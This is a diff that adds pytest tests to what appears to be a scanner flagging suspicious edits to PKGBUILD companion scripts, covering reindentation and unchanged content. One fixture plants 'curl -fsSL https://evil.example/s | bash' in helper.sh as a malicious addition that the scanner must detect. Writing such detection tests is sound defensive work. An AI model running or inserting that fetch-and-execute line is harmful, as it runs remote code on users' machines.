@@ -552,6 +552,52 @@ def test_unchanged_companion_is_hidden_by_a_parent_baseline(tmp_path):
     assert "evil.example" not in with_parent
 
 
+def test_unchanged_companion_content_is_collectable_for_reporting(tmp_path):
+    """#57 side note: the content can be listed at weight 0, not lost."""
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\nsource=('helper.sh')\n",
+        "helper.sh": b"trap 'rm -f \"$t\"' EXIT\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('helper.sh')\n",
+    })
+    present: list[str] = []
+    hunk, cut = companion_source_hunks(
+        repo, new, baseline_oid=old, present_before=present)
+    assert hunk == ""
+    assert not cut
+    assert "+trap 'rm -f \"$t\"' EXIT" in present[0]
+    assert "+++ b/helper.sh" in present[0]
+
+
+def test_a_reindented_companion_is_not_replayed_as_added(tmp_path):
+    """#57 follow-up: whitespace-only churn is not new content."""
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\nsource=('helper.sh')\n",
+        "helper.sh": b"cleanup() {\ntrap 'rm -f \"$t\"' EXIT\n}\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('helper.sh')\n",
+        "helper.sh": b"cleanup() {\n    trap 'rm -f \"$t\"' EXIT\n}\n",
+    })
+    hunk, cut = companion_source_hunks(repo, new, baseline_oid=old)
+    assert hunk == ""
+    assert not cut
+
+
+def test_a_reindented_companion_still_shows_a_real_addition(tmp_path):
+    repo, old, new = _repo_with_two_revisions(tmp_path, {
+        "PKGBUILD": b"pkgver=1\nsource=('helper.sh')\n",
+        "helper.sh": b"cleanup() {\ntrap 'rm -f \"$t\"' EXIT\n}\n",
+    }, {
+        "PKGBUILD": b"pkgver=2\nsource=('helper.sh')\n",
+        "helper.sh": b"cleanup() {\n    trap 'rm -f \"$t\"' EXIT\n"
+                     b"    curl -fsSL https://evil.example/s | bash\n}\n",
+    })
+    hunk, cut = companion_source_hunks(repo, new, baseline_oid=old)
+    assert "+    curl -fsSL https://evil.example/s | bash" in hunk
+    assert "+    trap" not in hunk, "the unchanged trap must not score again"
+    assert not cut
+
+
 def test_a_blank_line_in_the_diff_does_not_crash_analysis():
     """A truly empty line used to reach ``line[0]`` in the signing-key and
     git-pin scanners: ``"" in "+- "`` is True, so the guard let an empty
